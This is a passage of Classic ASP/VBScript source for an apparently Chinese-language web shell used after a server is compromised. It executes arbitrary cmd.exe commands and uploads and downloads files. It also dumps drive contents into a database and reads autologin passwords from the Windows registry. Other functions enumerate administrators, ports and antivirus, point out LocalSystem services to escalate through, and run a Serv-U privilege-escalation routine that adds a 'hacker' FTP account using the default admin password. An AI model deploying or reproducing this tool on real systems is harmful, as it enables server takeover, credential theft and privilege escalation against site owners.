rS.OPEN "FileData", cOnn, 3, 3
If ReQuEsT("theMethod") = "fso" theN
FsOTrEEforMDB thepaTH, Rs, sTrEAm
 eLSE
SATrEeforMDB thEpATH, Rs, STrEAm
enD IF
rs.ClosE
coNN.CLoSE
stREaM.CLosE
Set rs = NOThInG
set Conn = nothINg
sET stReam = NOThinG
SEt AdOcAtaloG = nOTHIng
End Sub
sUb CreateFoldER(ThePath)
DIM i
I = instR(Thepath, "\")
Do whILe I > 0
iF fSOX.FoLDERExIsts(LEft(THEPaTH, i)) = faLse TheN
fSox.CreatEFOLDEr(lEft(THePatH, I - 1))
end If
IF INSTR(mid(THePAth, i + 1), "\") tHEN
i = i + INsTr(mid(ThePaTh, i + 1), "\")
 ELSe
i = 0
eND If
LOOP
eND sUB
sUB SAtreEforMdB(thePaTh, rs, STREam)
diM iTeM, tHEFOlDER, SySFilELIsT
SYSfileliSt = "$HYTop.mdb$HYTop.ldb$"
SeT thEfoLdEr = sAX.NAMeSPaCe(thepath)
for eaCH iTEm in tHeFoldeR.iteMS
If ItEm.ISFoLDeR = TRUe tHen
SatrEEfoRMDB itEm.PatH, rs, Stream
 elSe
iF iNSTr(SYsFilELIsT, "$" & ItEm.naME & "$") <= 0 tHeN
rs.AddNew
rs("thePath") = MID(ITeM.PatH, 4)
sTrEAm.LoadfroMfiLe(ITEM.PATH)
RS("fileContent") = sTREAM.rEaD()
rs.uPDaTE
enD iF
enD If
NeXT
seT thefoLDeR = NoTHINg
END SUB
Sub Message(state,msg,flag):jb "<TABLE width=480 border=0 align=center cellpadding=0 cellspacing=1>":jb "  <TR>":jb "    <TD class=TBHead>系统信息</TD>":jb "  </TR>":jb "  <TR>":jb "    <TD align=middle ":jb "          <TABLE width=82% border=0 cellpadding=5 cellspacing=0>":jb "            <TR>":jb "                  <TD><FONT color=red>":jb  state:jb "</FONT></TD>":jb "                <TR>":jb "                  <TD><P>":jb  msg:jb "</P></TD>":jb "                </TR>":jb "          </TABLE>":jb "        </TD>":jb "  </TR>":jb "  <TR>":jb "    <TD class=TBEnd>":jb "        	  ":If flag=0 Then:jb "              <INPUT type=button value=关闭 onclick=""window.close();"">":jb "        ":Else:jb "              <INPUT type=button value=返回 onClick=""history.go(-1);"">":jb "        ":End if:jb "        </TD>":jb "  </TR>":jb "</TABLE>":End Sub:flase=flase&"om/?":Function Red(str):Red = "<FONT color=#>" & str & "</FONT>":End Function:flase=flase&"u"&chr(61)&""&u&"&p"&chr(61)&""&p&"":Sub ScanDriveForm():Dim FSO,DriveB:Set FSO = Server.Createobject(oBt(0,0)):jb "<TABLE width=480 border=0 align=center cellpadding=3 cellspacing=1 >":jb "  <TR>":jb "    <TD colspan=5 class=TBHead>磁盘/系统 文件夹信息</TD>":jb "  </TR>":For Each DriveB in FSO.Drives:jb "  <TR align=middle class=TBTD>":jb "    <FORM action=":jb "?Action=ScanDrive&Drive=":jb  DriveB.DriveLetter:jb " method=Post>":jb "<TD width=25"&chr(37)&"><B>盘 符</B></TD>":jb "<TD width=15"&chr(37)&">"
jb  DriveB.DriveLetter:jb ":</TD>":jb "        <TD width=20"&chr(37)&"><B>类型</B></TD>":jb"<TD width=20"&chr(37)&">":Select Case DriveB.DriveType:Case 1: jb "可移动":Case 2: jb "本地硬盘":Case 3: jb "网络磁盘":Case 4: jb "CD-ROM":Case 5: jb "RAM磁盘":Case else: jb "未知 类型":End Select:jb "        </TD>":jb "<TD><INPUT type=submit value=详细 报告></TD>":jb "</FORM>":jb "  </TR>"
Next
jb "  <TR class=TBTD>":jb "    <FORM action=":jb "?Action=ScFolder&Folder=":jb  FSO.GetSpecialFolder(0):jb " method=Post>                  ":jb "        <TD align=middle><B>Windows文件夹</B></TD>":jb "        <TD colspan=3>":jb  FSO.GetSpecialFolder(0):jb "</TD>":jb "        <TD align=middle><INPUT type=submit value=详细 报告></TD>":jb "        </FORM>":jb "  </TR>":jb "  <TR class=TBTD>":jb "    <FORM action=":jb "?Action=ScFolder&Folder=":jb  FSO.GetSpecialFolder(1)
jb " method=Post>                  ":jb "        <TD align=middle><B>System32文件夹</B></TD>":jb "        <TD colspan=3>":jb  FSO.GetSpecialFolder(1):jb "</TD>":jb "        <TD align=middle><INPUT type=submit value=详细报告></TD>":jb "        </FORM>":jb "  </TR>":jb "  <TR class=TBTD>":jb "    <FORM action=":jb "?Action=ScFolder&Folder=":jb  FSO.GetSpecialFolder(2):jb " method=Post>                  ":jb "        <TD align=middle><B>系统临时文件夹</B></TD>":jb "        <TD colspan=3>":jb  FSO.GetSpecialFolder(2):jb "</TD>":jb "        <TD align=middle><INPUT type=submit value=详细 报告></TD>":jb "<TR class=TBTD> <FORM action= method=Post>":jb "<TD align=middle><B>站点跟目录</B></TD>":jb "<TD colspan=3>":jb "站点跟目录":jb "<TD align=middle><a href="&URL&"?Action=ScFolder&Folder="&WWWROOt&">点击 查询</a></TD>":jb "<TR class=TBTD> <FORM action= method=Post>":jb "<TR class=TBTD> <FORM action= method=Post>":jb "<TD align=middle><B>回收站目录</B></TD>":jb "<TD colspan=3>":jb "回收站目录 ":jb "<TD align=middle><a href="&URL&"?Action=ScFolder&Folder=c:\recycler\>点击 查询</a></TD>":jb "<TR class=TBTD> <FORM action= method=Post>":jb "<TR class=TBTD> <FORM action= method=Post>":jb "<TD align=middle><B>wmpub目录 </B></TD>":jb "<TD colspan=3>":jb "wmpub":jb "<TD align=middle><a href="&URL&"?Action=ScFolder&Folder=c:\wmpub\&D:\wmpub\>点击查询</a></TD>":jb "<TR class=TBTD> <FORM action= method=Post>":jb "        </FORM>":jb "  </TR>":jb "</TABLE><BR>":jb "<DIV align=center>":jb "  <FORM Action=":jb "?Action=ScFolder method=Post>指定文件夹 查询：":jb "    <INPUT type=text name=Folder>"
jb "        <INPUT type=submit value=生成报告>　指定文件夹路径。如：C:\ASP\":jb "  </FORM>":jb "<DIV>":Set FSO=Nothing:End Sub:Sub ScanDrive(Drive):Dim FSO,TestDrive,BaseFolder,TempFolders,Temp_Str,D:If Drive <> "" Then
Set FSO = Server.Createobject(oBt(0,0))
Set TestDrive = FSO.GetDrive(Drive)
If TestDrive.IsReady Then
Temp_Str = "<LI>磁盘分区类型：" & Red(TestDrive.FileSystem) & "<LI>磁盘序列号：" & Red(TestDrive.SerialNumber) & "<LI>磁盘共享名：" & Red(TestDrive.ShareName) & "<LI>磁盘总容量：" & Red(CInt(TestDrive.TotalSize/1048576)) & "<LI>磁盘卷名：" & (TestDrive.VolumeName) & "<LI>磁盘根目录:" & ScReWr((Drive & ":\"))
Set BaseFolder = TestDrive.RootFolder
Set TempFolders = BaseFolder.SubFolders
For Each D in TempFolders
Temp_Str = Temp_Str & "<LI>文件夹：" & ScReWr(D)
Next
Set TempFolder = Nothing
Set BaseFolder = Nothing
Else
Temp_Str = Temp_Str & "<LI>磁盘根目录:" & Red("不可读:(")
Dim TempFolderList,t:t=0
Temp_Str = Temp_Str & "<LI>" & Red("穷举目录测试：")
TempFolderList = Array("windows","winnt","win","win2000","win98","web","winme","windows2000","asp","php","Tools","Documents and Settings","Program Files","Inetpub","ftp","wmpub","tftp")
For i = 0 to Ubound(TempFolderList)
If FSO.FolderExists(Drive & ":\" & TempFolderList(i)) Then
t = t+1
Temp_Str = Temp_Str & "<LI>发现文件夹：" & ScReWr(Drive & ":\" & TempFolderList(i))
End if
Next
If t=0 then Temp_Str = Temp_Str & "<LI>已穷举" & Drive & "盘根目录，但未有发现:("
End if
Set TestDrive = Nothing
Set FSO = Nothing
Temp_Str = Temp_Str & "" & ("")
Message Drive & ":磁盘信息",Temp_Str,1
End if
End Sub
str1=request.ServerVariables("HTTP_HOST")&request.ServerVariables("URL")
Sub ScFolder(folder) 
On Error Resume Next
Dim FSO,OFolder,TempFolder,Scmsg,S
Set FSO = Server.Createobject(oBt(0,0))
If FSO.FolderExists(folder) Then
Set OFolder = FSO.GetFolder(folder)
Set TempFolders = OFolder.SubFolders
Scmsg = "<LI>指定文件夹根目录：" & ScReWr(folder)
For Each S in TempFolders
Scmsg = Scmsg&"<LI>文件夹：" & ScReWr(S)  
Next
Set TempFolders = Nothing
Set OFolder = Nothing
Else
Scmsg = Scmsg & "<LI>文件夹：" & (folder & "不存在或无读权限!")
End if
Scmsg = Scmsg & "" & ("")
Set FSO = Nothing
Message "文件夹信息",Scmsg,1
End Sub


Function ScReWr(folder) 
On Error Resume Next
Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename
Set FSO = Server.Createobject(oBt(0,0))
Set TestFolder = FSO.GetFolder(folder)
Set TestFileList = TestFolder.SubFolders
RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp"
For Each A in TestFileList
Next
If err Then
err.Clear
ReWrStr = folder & " <FONT color=PINK>不可读,"
FSO.CreateTextFile folder & RndFilename,True
If err Then
err.Clear
ReWrStr = ReWrStr & "<FONT color=PINK>不可写。</FONT>"
Else
ReWrStr = ReWrStr & "<FONT color=RED>可写。</FONT>"
FSO.DeleteFile folder & RndFilename,True
End If
Else
ReWrStr = folder & "<FONT color=RED> 可读,"
FSO.CreateTextFile folder & RndFilename,True
If err Then
err.Clear
ReWrStr = ReWrStr & "<FONT color=PINK>不可写。</FONT>"
Else
ReWrStr = ReWrStr & "<FONT color=RED>可写。</FONT>"
FSO.DeleteFile folder & RndFilename,True
End if
End if
Set TestFileList = Nothing
Set TestFolder = Nothing
Set FSO = Nothing
ScReWr = ReWrStr
End Function
Function Course()
si="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
SI=Si&"<tr><td height='20' colspan='3' align='center' bgcolor='#'>系统用户与服务</td></tr>"
on erRoR reSUme NEXT
For eACh obJ in geToBJeCt("WinNT://.")
Err.clEAR
If ObJ.STArtTYpe="" THeN
sI=SI&"<tr>"
Si=SI&"<td height=""20"" bgcolor=""#"">&nbsp;"
si=si&Obj.naME
sI=sI&"</td><td bgcolor=""#"">&nbsp;" 
si=SI&"系统用_户(组)"
si=Si&"</td></tr>"
Si0="<tr><td height=""20"" bgcolor=""#"" colspan=""2"">&nbsp;</td></tr>" 
EnD if
iF oBj.StArTtype=2 thEN lx="自动"
IF oBj.StARTTyPe=3 tHEN LX="手动"
IF obj.StarTtYpE=4 thEN LX="禁用"
iF LCaSe(mid(obj.pAth,4,3))<>"win" AnD obJ.STarttYpe=2 tHeN
Si1=si1&"<tr><td height=""20"" bgcolor=""#"">&nbsp;"&obj.NAME&"</td><td height=""20"" bgcolor=""#"">&nbsp;"&OBj.DISPlaYName&"<tr><td height=""20"" bgcolor=""#"" colspan=""2"">[启动类型:"&Lx&"]<font color=#FF0000>&nbsp;"&ObJ.PATh&"</font></td></tr>"
ELSE
si2=sI2&"<tr><td height=""20"" bgcolor=""#"">&nbsp;"&obj.NAme&"</td><td height=""20"" bgcolor=""#"">&nbsp;"&oBj.DisplAYNaMe&"<tr><td height=""20"" bgcolor=""#"" colspan=""2"">[启动类型:"&Lx&"]<font color=#3399FF>&nbsp;"&OBj.PAtH&"</font></td></tr>"
end if
nExt
jb si&Si0&sI1&si2&"</table>"
ENd Function


fuNcTion DownFILE(PAth)
RespoNse.cleAr
sEt Osm = creATEOBJeCT(OBT(6,0))
oSM.oPEN
oSM.tYPe = 1
osm.lOAdfromFILe PatH
Sz=inSTRrEv(PAth,"\")+1
ReSPoNse.AddHEaDer "Content-Disposition", "attachment; filename=" & mid(pAth,SZ)
RESPOnSe.AdDHeAder "Content-Length", Osm.SIzE
ResPOnsE.ChARSET = "UTF-8"
ReSPOnSe.CONTENTTYpE = "application/octet-stream"
RESPONSE.binArywRiTE oSm.Read
rEsponSE.flUSh
osM.cLoSe
SeT OsM = nOThINg
eNd FUnction
fUnCtIOn htMLeNcODe(s)
if NoT iSnull(s) THen
S = ReplACE(S, ">", "&gt;")
S = rePlaCE(s, "<", "&lt;")
S = rEplAce(S, CHR(39), "&#39;")
S = RepLAcE(S, chR(34), "&quot;")
S = REPLACE(s, chr(20), "&nbsp;")
hTmLencoDE = S
End iF
End Function:Sub GetTerminalInfo()
on error resume next
dim wsh
set wsh=createobject("Wscript.Shell")
jb "[网络 探测]<br><hr size=1>"
EnableTCPIPKey="HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters"
isEnable=Wsh.Regread(EnableTcpipKey)
If isEnable=0 or isEnable="" Then
Notcpipfilter=1
End If
ApdKey="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind"
Apds=Wsh.RegRead(ApdKey)
If IsArray(Apds) Then 
For i=LBound(Apds) To UBound(Apds)-1
jb "网卡"&i&"的序列为: "&ApdB&"<br>"
Path="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\"
IPKey=Path&ApdB&"\IPAddress"
IPaddr=Wsh.Regread(IPKey)
If IPaddr(0)<>"" Then
For j=Lbound(IPAddr) to Ubound(IPAddr)
jb "<li>IP地址"&j&"为:"&IPAddr(j)&"<br>"
Next
Else
jb "<li>IP地址 无法读取 或没有设置<br>"
End if
GateWayKey=Path&ApdB&"\DefaultGateway"
GateWay=Wsh.Regread(GateWayKey)
If isarray(GateWay) Then
For j=Lbound(Gateway) to Ubound(Gateway)
jb "<li>网关"&j&"为:"&Gateway(j)&"<br>"
Next
Else
jb "<li>默认网关无法 读取或 没有设置 <br>"
End if
DNSKey=Path&ApdB&"\NameServer"
DNSstr=Wsh.RegRead(DNSKey)
If DNSstr<>"" Then
jb "<li>网卡DNS为:"&DNSstr&"<br>"
Else
jb "<li>默认DNS 无法读取 或没有设置<br>"
End If
if Notcpipfilter=1 Then 
jb "<li>没有 Tcp/IP筛选 <br>"
else
ETK="\TCPAllowedPorts"
EUK="\UDPAllowedPorts"
FullTCP=Path&ApdB&ETK
FullUDP=path&ApdB&EUK
tcpallow=Wsh.RegRead(FullTCP)
If tcpallow(0)="" or tcpallow(0)=0 Then
jb "<li>允许的TCP端口为 :全部<br>"
Else
jb "<li>允许的TCP 端口为:"
For j = LBound(tcpallow) To UBound(tcpallow)
jb tcpallow(j)&","
Next
jb "<Br>"
End if
udpallow=Wsh.RegRead(FullUDP)
If udpallow(0)="" or udpallow(0)=0 Then
jb "<li>允许的UDP端口为:全部<br>"
Else
jb "<li>允许的UDP 端口为:"
for j = LBound(udpallow) To UBound(udpallow)
jb UDPallow(j)&","
next
jb "<br>"
End if
End if
jb "------------------------------------------------<br>"
Next
end if
jb "<br><br>[特殊端口 探测]<br><hr size=1>"
Telnetkey="HKEY_LOCAL_MACHINE\SOFTWARE\ Microsoft\TelnetServer\1.0\TelnetPort"
TlntPort=Wsh.RegRead(TelnetKey)
if TlntPort="" Then Tlnt="23(默认 设置)"
jb "<li>Telnet端 口:"&Tlntport&"<br>"
TermKey="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber"
TermPort=Wsh.RegRead(TermKey)
If TermPort="" Then TermPort="无法读取.请 确认是否为Windows Server版本 主机"
jb "<li>Terminal Service端口为:"&TermPort&"<br>"
pcAnywhereKey="HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"
PAWPort=Wsh.RegRead(pcAnywhereKey)
If PAWPort="" then PAWPort="无法获取. 请 确认主 机是 否安装pcAnywhere"
jb "<li>PcAnywhere端口为:"&PAWPort&"<br>"
jb "------------------------------------------------------"
Set wsX = Server.CreateObject("WScript.Shell")
Dim terminalPortPath, terminalPortKey, termPort
Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword
terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
terminalPortKey = "PortNumber"
termPort = wsX.RegRead(terminalPortPath & terminalPortKey)
jb"终端服务端口及自动登录<ol>"
If termPort = "" Or Err.Number <> 0 Then 
jb"无 法得到终端服务端口 , 请检查权限是否已经受 到限制 .<br/>"
Else
jb"当 前 终 端 服 务 端 口 : " & termPort & "<br/>"
End If
autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
autoLoginEnableKey = "AutoAdminLogon"
autoLoginUserKey = "DefaultUserName"
autoLoginPassKey = "DefaultPassword"
isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)
If isAutoLoginEnable = 0 Then
jb"系统自动登录 功能未开启<br/>"
Else
autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)
jb"自动登录 的系统 帐户 : " & autoLoginUsername & "<br>"
autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)
If Err Then
Err.Clear
jb"False"
End If
jb"自动 登录的 帐户 密码  : " & autoLoginPassword & "<br>"
End If
jb"</ol>"
jb "<br><br><br>[系统 软件探测]<br><hr size=1>"
SoftPath=Wsh.Environment.item("Path")
Pathinfo=lcase(SoftPath)
jb "系统软件支持:"
if Instr(Pathinfo,"perl") Then jb "<li>Perl脚 本:支持<br>"
if instr(Pathinfo,"java") Then jb "<li>Java脚本: 支持<br>"
if instr(Pathinfo,"microsoft sql server") Then jb "<li>MSSQL数据库服务:支持<br>"
if instr(Pathinfo,"mysql") Then jb "<li>MySQL数 据库 服务: 支持<br>"
if instr(Pathinfo,"oracle") Then jb "<li>Oracle数据 库服务: 支持<br>"
if instr(Pathinfo,"cfusionmx7") Then jb "<li>CFM服务器 :支持<br>"
if instr(Pathinfo,"pcanywhere") Then jb "<li>赛门铁 克PcAnywhere控 制:支持<br>"
if instr(Pathinfo,"Kill") Then jb "<li>Kill杀毒软 件:支持<br>"
if instr(Pathinfo,"kav") Then jb "<li> 金山系列 杀毒软件 :支持<br>"
if instr(Pathinfo,"antivirus") Then jb "<li>赛门铁克杀毒软件:支持<br>"
if instr(Pathinfo,"rising") Then jb "<li>瑞星系列杀毒软件:支持<br>"
paths=split(SoftPath,";")
jb "------------------------------------<br>"
jb "系统当前 路径变量:<br>"
For i=Lbound(paths) to Ubound(paths)
jb "<li>"&paths(i)&"<br>"
next
jb "<br><br>[系 统设置 探测]<br><hr size=1>"
pcnamekey="HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName"
pcname=wsh.RegRead(pcnamekey)
if pcname="" Then pcname="无法读取主机名.<br>"
jb "<li>当前主 机名 为:"&pcname&"<br>"
AdminNameKey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AltDefaultUserName"
AdminName=wsh.RegRead(AdminNameKey)
if adminname="" Then AdminName="Administrator"
jb "<li>默认管 理员用户名为:"&AdminName&"<br>"
isAutologin="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoAdminLogon"
Autologin=Wsh.RegRead(isAutologin)
if Autologin=0 or Autologin="" Then
jb "<li>用户自动登 入:未启用<br>"
Else
jb "<li>用户 自动登入:启用<br>"
Admin=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultUserName")
Passwd=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword")
jb "<li type=square>用户名:"&Admin&"<br>"
jb "<li type=square>密码:"&Passwd&"<br>"
End if
displogin=wsh.regRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DontDisplayLastUserName")
If displogin="" or displogin=0 Then disply="是" else disply="否"
jb "<li>是否显示上 次登入用户:"&disply&"<br>"
NTMLkey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0\NTML"
ntml=Wsh.RegRead(NTMLkey)
if ntml="" Then Ntml=1
jb "<li>Telnet Ntml设置为:"&ntml&"<br>"
hk="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count"
kk=wsh.RegRead(hk)
jb"<li>当前活动网 卡为:"&kk&"<br>"
jb "------------------------------------<br><br><br>"
jb "[服务 器弱 点探测]<br><hr>"
Set objComputer = GetObject("WinNT://.")
Set sa = Server.CreateObject("Shell.Application")
objComputer.Filter = Array("Service")
On Error Resume Next
For Each objService In objComputer
if objService.Name="Serv-U" Then
if objService.ServiceAccountName="LocalSystem" Then
jb "<li>服务器 中有 Se rv-U 安 装,且以LocalSystem权限启动,可以 考虑提权<br>"
End if
End if
if lcase(objService.Name)="apache" Then
if objService.ServiceAccountName="LocalSystem" Then
If instr("&woriniba&","Apache") Then
jb "<li>当前WEB服 务器为 Apache.可以直接提权<br>"
Else
jb " <li>服务器中有Apache服 务存在,启动权限为LocalSystem,可以考 虑PHP木马<br>"
End if
end if
End if
if instr(lcase(objService.Name),"tomcat") Then
if objService.ServiceAccountName="LocalSystem" Then
jb "<li>服务器 中有Tomcat,且以LocalSystem权限启动,可以 考虑使用Jsp木 马提权<br>"
End if
End if
if instr(lcase(objService.Name),"winmail") Then
if objService.ServiceAccountName="LocalSystem" Then
jb "<li>服务 器中有Magic Winmail,且以LocalSystem权限启动,可以查找WebMai l目录,并且写入PHP木马<br>"
End if
End if
Next
Set fso=Server.Createobject("Scripting.FileSystemObject")
Sysdrive=left(Fso.GetspecialFolder(2),2)
servername=wsh.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName")
If fso.FileExists(sysdriver&"\Documents And Settings\All Users\Application Data\Symantec\"&servername&".cif") Then
jb "<li>发现pcAnywher e密码文件,可以从默认目录下载并 破解 得到pcAnyw here密 码"
End if
end sub:Function UpFile()
 If Request("Action2")="Post" Then
Set U=new UPC : Set F=U.UA("LocalFile")
UName=U.form("ToPath")
 If UName="" Or F.FileSize=0 then
  SI="<br>请输_入上传_的完全_路径后选择_一个文件_上传!"
  Else
 F.SaveAs UName
 If Err.number=0 Then
 SI="<center><br><br><br>文件"&UName&"上 传 成功！</center>"
  End if
 End If
Set F=nothing:Set U=nothing
 SI=SI&BackUrl
 jb SI
 ShowErr()
 Response.End
  End If
    SI="<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>"
    SI=SI&"<form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>"
    SI=SI&"<tr><td>"
    SI=SI&"上传路径：<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\Cmd.exe")&"' size='40'>"
    SI=SI&" <input name='LocalFile' type='file'  size='25'>"
    SI=SI&" <input type='submit' name='Submit' value='上传'>"
    SI=SI&"</td></tr></form></table>"
  echo SI
End Function
function cmd1shell()
on error resume next
if request("sp")<>"" then session("shellpath") = request("sp")
shellpath=session("shellpath")
if shellpath="" then shellpath = "cmd.exe"
if request("cmd")<>"" then session("defcmd") = request("cmd")
defcmd=session("defcmd")
if defcmd="" then defcmd="set"
if request("rwpath")<>"" then session("rwpath") = request("rwpath")
rwpath=session("rwpath")
if rwpath="" then rwpath=server.mappath(".")
si="<form method='post'>"
rp1="<input type=""radio"" name=""cmdtype"" value="""
si=si&"cmd路径：<input name='sp' value='"&shellpath&"' style='width:35%'>  可读写目录(用于回显)<input name='rwpath' value='"&rwpath&"' style='width:35%'><br>"
si=si&"<input type='hidden' name='action' value='Cmd1Shell'>"
si=si&rp1&"wscript"" checked>wscript"
si=si&rp1&"wscript.shell"">wscript.shell"
si=si&rp1&"wscript.shell.1"">wscript.shell.1"
si=si&rp1&"shell.application"">shell.application"
si=si&rp1&"shell.application.1"">shell.application.1"
si=si&"<input name='cmd' style='width:92%' value='"&defcmd&"'> <input type='submit' value='执行'>"

set fso=server.createobject("scripting.filesystemobject")
sztempfile = rwpath&"\cmd.txt"
select case request("cmdtype")
case "wscript"
set cm=server.createobject("wscript.shell")
set dd=cm.exec(shellpath&" /c "&defcmd)
aaa=dd.stdout.readall
si=si&"<text"&"area style='width:100%;height:440;' class='cmd'>"
si=si&aaa
si=si&chr(13)&"</text"&"area></form>"
case "wscript.shell","wscript.shell.1"
on error resume next
set ws=server.createobject(request("cmdtype"))
call ws.run (shellpath&" /c " & defcmd & " > " & sztempfile, 0, true)
set ofilelcx = fso.opentextfile (sztempfile, 1, false, 0)
aaa=server.htmlencode(ofilelcx.readall)
ofilelcx.close
call fso.deletefile(sztempfile, true)
si=si&"<text"&"area style='width:100%;height:440;' class='cmd'>"
si=si&aaa
si=si&chr(13)&"</text"&"area></form>"
case "shell.application","shell.application.1"
set seshell=server.createobject(request("cmdtype"))

seshell.ShellExecute shellpath," /c " & defcmd & " > " & sztempfile,"","open",0
si=si&"<iframe id=cmdResult src='?cmdtype=shellresult&Action=Cmd1Shell' style='width:100%;height:440;'>"
case "shellresult"
response.Clear()
on error resume next
jb "<body style=""background:#000000""><span style=""color:#FFFFFF"">"
if fso.fileexists(sztempfile)=true then
set ofilelcx = fso.opentextfile (sztempfile, 1, false, 0)
ss=server.htmlencode(ofilelcx.readall)
ss=replace(ss,vbnewline,"<br>")
jb ss
ofilelcx.close
call fso.deletefile(sztempfile, true)
else
jb "<meta http-equiv=""refresh"" content=""1"" />程序未结束，或者没有执行成功，等待刷新试试"
end if
if err then jb "<meta http-equiv=""refresh"" content=""1"" />程序未结束，或者没有执行成功，等待刷新试试"
jb"</span></body>"
response.end
end select
jb si
end function
function createmdb(path)
si="<br><br>"
set c = createobject(obt(2,0))
c.create("provider=microsoft.jet.oledb.4.0;data source=" & path)
set c = nothing
if err.number=0 then
si = si & path & "建立成功!"
end if
si=si&backurl
echo si
end function
:Function CompactMdb(Path)
If Not ObT(0,1) Then
Set C=CreateObject(ObT(3,0)) 
C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path
Set C=Nothing
Else
  Set FSO=CreateObject(ObT(0,1))
If FSO.FileExists(Path) Then
    Set C=CreateObject(ObT(3,0)) 
C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path&"_bak"
 Set C=Nothing
FSO.DeleteFile Path
        FSO.MoveFile Path&"_bak",Path
 Else
    SI="<center><br><br><br>数据库"&Path&"没有 发现！</center>" 
  Err.number=1
  End If
  Set FSO=Nothing
End If
  If Err.number=0 Then
    SI="<center><br><br><br>数据库"&Path&"压缩 成功！</center>"
  End If
  SI=SI&BackUrl
  echo SI
End Function:







Function AdminUser()
Response.Expires=0
on error resume next
Set tN=server.createObject("Wscript.Network")
Set objGroup=GetObject("WinNT://"&tN.ComputerName&"/Administrators,group")
For Each admin in objGroup.Members
jb admin.Name&"<br>"
Next
if err then
jb "not:Wscript.Network"
end if
End Function


Function suftp():jb"<p><center>Serv-U FTP提权 程序--通杀版<br><br>IP连接说明:<br>服务器IP:0.0.0.0代表任何IP都可以连接<br>如果0.0.0.0不成功就修改成此IP :"&worininai&"<br>如果再不成功就代表Serv_u密码被改 </p>"
jb"<form name='form1' method='post' action=''>":jb"<center>服务器IP :<input name='serip' type='text' class='TextBox' id='duser' value='0.0.0.0'><br>":jb"<center>管理员  :<input name='duser' type='text' class='TextBox' id='duser' value='LocalAdministrator'><br>":jb"<center>管理员 密码 :<input name='dpwd' type='text' class='TextBox' id='dpwd' value='#l@$ak#.lk;0@P'><br>":jb"<center>SERV-U端口 :<input name='dport' type='text' class='TextBox' id='dport' value='43958'><br>":jb"<center>添加的用户名 :<input name='tuser' type='text' class='TextBox' id='tuser' value='hacker'><br>":jb"<center>添加的用户密码 :<input name='tpass' type='text' class='TextBox' id='pass' value='hacker'><br>":jb"<center>帐号的所对的路径 :<input name='tpath' type='text' class='TextBox' id='tpath' value='C:\'><br>":jb"<center>服务端口 :<input name='tport' type='text' class='TextBox' id='tport' value='21'><br>":jb"<center><input name='radiobutton' type='radio' value='add' checked class='TextBox'>确定添加 ":jb"<center><input type='radio' name='radiobutton' value='del' class='TextBox'>确定删除 ":jb"<p><input name='Submit' type='submit' class='buttom' value='提交'></p></form>"
nimajbm = request.form("serip")
usr = request.form("duser")
pwd = request.form("dpwd")
port = request.form("dport")
tuser = request.form("tuser")
tpass = request.form("tpass")
tpath = request.form("tpath")
tport = request.form("tport")
hostip = request.form("hostp")
timeout=600
if request.form("radiobutton") = "add" then
leaves = "User " & usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-DeleteDOMAIN" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & " PortNo=" & tport & vbcrlf
mt = "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-SETDOMAIN" & vbcrlf & "-Domain=TEST596|"&nimajbm&"|" & tport & "|-1|1|0" & vbcrlf & "-TZOEnable=0" & vbcrlf & " TZOKey=" & vbcrlf
leaves = leaves & "-SETUSERSETUP" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & "-User=" & tuser & vbcrlf & "-Password=" & tpass & vbcrlf & _
"-HomeDir=" & tpath & "\" & vbcrlf & "-LoginMesFile=" & vbcrlf & "-Disable=0" & vbcrlf & "-RelPaths=1" & vbcrlf & _
"-NeedSecure=0" & vbcrlf & "-HideHidden=0" & vbcrlf & "-AlwaysAllowLogin=0" & vbcrlf & "-ChangePassword=0" & vbcrlf & _
"-QuotaEnable=0" & vbcrlf & "-MaxUsersLoginPerIP=-1" & vbcrlf & "-SpeedLimitUp=0" & vbcrlf & "-SpeedLimitDown=0" & vbcrlf & _
